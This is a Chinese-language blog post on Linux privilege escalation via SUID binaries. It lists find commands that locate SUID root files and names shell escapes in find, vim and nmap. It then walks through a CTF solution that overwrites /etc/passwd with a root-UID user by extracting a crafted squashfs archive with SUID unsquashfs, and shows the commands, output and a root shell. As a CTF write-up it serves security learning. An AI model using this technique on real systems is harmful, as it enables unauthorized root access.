---
layout: post
title: Linux 利用 SUID权限 提权例子
comments: false
description: ""
keywords: "Vulnerability"
---

SUID【Set User ID】作用就是：让本来没有相应权限的用户运行这个程序时，可以访问没有权限访问的资源。

即：具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。

这时问题就容易出现了，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为文件所有者的权限【多root】。

## 寻找方法

可以粗略寻找拥有SUID权限的程序文件，再看所有者是否为高权限【e.g. root】用户；

```
find / -perm -u=s -type f 2>/dev/null
```

当然也可以直接寻找即为root用户，也拥有SUID权限的程序；

```
find / -user root -perm -4000 -print 2>/dev/null
```

## 利用方式

其一【实际渗透测试】：

采用程序自身的命令执行参数，如：find命令的-exec功能、vim命令的:shell功能、老版nmap交互界面的!sh功能...

其二【CTF】：

依靠程序自身的功能替换passwd文件，如：unsquashfs解压功能【2018赛博地球杯-SDN本地提权】；

## 2018赛博地球杯-SDN本地提权

由于/etc/passwd非root也可读，复制并保存到本地名同为passwd，在最后添加新用户信息，hash为本地生成，UID、GID均为root，家目录为/root，使用bash；

```
Go0s:$6$ywufMHi0$NhYwAQ4cX38MyvBAGpJd5/uBGcA4oWU6asdasvR/Z.hd/GltM1VXXJsadasdsdfHZTiYMj8OqqlicKH6OBQMM1:0:0::/root:/bin/bash
```

生成exp，在本地使用 `mksquashfs` 生成squashfs格式文件；

```
文件格式：
test@PC:~$ tree squashfs-root 
squashfs-root
└── etc
    └── passwd

test@PC:~$ mksquashfs squashfs-root/ exp
Parallel mksquashfs: Using 4 processors
Creating 4.0 filesystem on exp, block size 131072.
[===================================================================|] 2/2 100%

Exportable Squashfs 4.0 filesystem, gzip compressed, data block size 131072
	compressed data, compressed metadata, compressed fragments, compressed xattrs
	duplicates are removed
Filesystem size 2.65 Kbytes (0.00 Mbytes)
	20.77% of uncompressed filesystem size (12.78 Kbytes)
Inode table size 73 bytes (0.07 Kbytes)
	56.15% of uncompressed inode table size (130 bytes)
Directory table size 54 bytes (0.05 Kbytes)
	79.41% of uncompressed directory table size (68 bytes)
Number of duplicate files found 0
Number of inodes 4
Number of files 2
Number of fragments 1
Number of symbolic links  0
Number of device nodes 0
Number of fifo nodes 0
Number of socket nodes 0
Number of directories 2
Number of ids (unique uids + gids) 1
Number of uids 1
	test (1000)
Number of gids 1
	test (1000)
```

利用，直接使用拥有SUID权限的`unsquashfs`解压squashfs格式文件到根目录，即可覆盖掉/etc/passwd；

```
l4ozu1@L4oZu1PC:~/Desktop$ unsquashfs -d / -f exp
Parallel unsquashfs: Using 4 processors
2 inodes (2 blocks) to write

[===================================================================|] 2/2 100%

created 2 files
created 2 directories
created 0 symlinks
created 0 devices
created 0 fifos
```

验证，提权成功：

```
l4ozu1@L4oZu1PC:~/Desktop$ su Go0s
密码： 
root@L4oZu1PC:/home/l4ozu1/Desktop# id
uid=0(root) gid=0(root) 组=0(root)
```